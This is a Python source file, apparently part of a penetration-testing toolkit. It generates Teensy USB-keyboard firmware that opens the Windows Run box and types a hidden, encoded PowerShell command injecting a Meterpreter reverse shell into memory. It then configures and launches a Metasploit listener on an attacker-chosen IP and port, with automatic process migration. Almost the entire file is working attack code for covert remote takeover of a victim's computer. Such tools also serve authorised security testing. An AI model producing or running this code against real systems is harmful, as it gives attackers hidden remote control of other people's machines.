#!/usr/bin/python
import pexpect
from src.core.setcore import yesno_prompt
from src.core import *

print """
The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.

This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
"""

payload = raw_input("Select payload you want to delivery via the powershell - shellcode injection\n\n1. Metasploit Meterpreter (x86)\n2. Metasploit Meterpreter (x64)\n\nEnter your choice: ")

if payload == "": payload = "2"

if payload == "1":
    path = setdir + "/x86.powershell"
    payload = "windows/meterpreter/reverse_tcp"
if payload == "2":
    path = setdir + "/x64.powershell"
    payload = "windows/x64/meterpreter/reverse_tcp"


# create base metasploit payload to pass to powershell.prep
filewrite = file(setdir + "/metasploit.payload", "w")
filewrite.write(payload)
filewrite.close()

import src.payloads.powershell.prep

fileopen = file(path, "r")
#payload_encoded = fileopen.read()

# read in x amount of bytes
data_read = int(50)

output_variable = "#include <avr/pgmspace.h>\n"

counter = 0

while 1:
    reading_encoded = fileopen.read(data_read).rstrip()
    if reading_encoded == "": break
    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_encoded)
    counter = counter + 1

rev_counter = 0
output_variable += "PROGMEM const char *exploit[] = {\n"

while rev_counter != counter:
    output_variable+="RevShell_%s" % rev_counter
    rev_counter = rev_counter +1
    if rev_counter == counter:
        output_variable+="};\n"
    if rev_counter != counter:
        output_variable+=",\n"

teensy = output_variable

# write the rest of the teensy code
teensy+=("""
char buffer[55];
int ledPin = 11;

void setup() {
  pinMode(ledPin, OUTPUT);
}
void loop()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd");
  delay(750);
  Keyboard.print("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand ");
  // Write the binary to the notepad file
  int i;
  for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
    strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
    Keyboard.print(buffer);
    delay(30);
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  //delay(20000);
  //Keyboard.println("exit");
  delay(9000000);
}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
void SPRE(int KeyCode){
Keyboard.set_modifier(MODIFIERKEY_SHIFT);
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
""")
print "[*] Payload has been extracted. Copying file to %s/reports/teensy.pde" % (setdir)
filewrite = file(setdir + "/reports/teensy.pde", "w")
filewrite.write(teensy)
filewrite.close()
choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
if choice == "YES":


    # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
        update_options("IPADDR=" + ipaddr)

    if check_options("PORT=") != 0:
        port = check_options("PORT=")

    else:
        port = raw_input("Enter the port to connect back on: ")

    filewrite = file(setdir + "/metasploit.answers", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
    filewrite.close()
    print "[*] Launching Metasploit...."
    try:
        child = pexpect.spawn("msfconsole -r %s/metasploit.answers" % (setdir))
        child.interact()
    except: pass
